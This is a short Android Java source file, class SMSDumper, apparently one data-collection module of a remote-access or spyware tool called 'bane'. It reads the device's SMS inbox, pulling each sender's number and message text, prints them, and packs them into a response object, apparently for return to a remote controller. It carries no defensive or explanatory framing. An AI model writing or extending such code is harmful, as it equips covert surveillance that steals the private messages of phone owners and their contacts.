package com.example.bane.bane.dumper;

import android.database.Cursor;
import android.net.Uri;
import com.bane.model.BaneCode;
import com.bane.model.BaneObject;
import com.bane.model.BaneValue;
import com.example.bane.BaneService;
import java.util.ArrayList;
import java.util.Arrays;

public class SMSDumper extends Dumper {

    @Override
    public BaneObject dump() {
        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor cursor = BaneService.context.getContentResolver().query(uriSms, new String[]{"_id", "address", "date", "body"},null,null,null);

        cursor.moveToFirst();
        ArrayList<String> sms = new ArrayList<>();

        while  (cursor.moveToNext())
        {
            String address = cursor.getString(1);
            String body = cursor.getString(3);
            sms.add("Phone number: "+address+" text: "+body);
            System.out.println("Mobile number: "+address);
            System.out.println("Text: "+body);
        };
        return new BaneObject(BaneCode.RESPONSE,"",new BaneValue[]{
                new BaneValue<String>("sms", Arrays.toString(sms.toArray()))
        });
    }
}
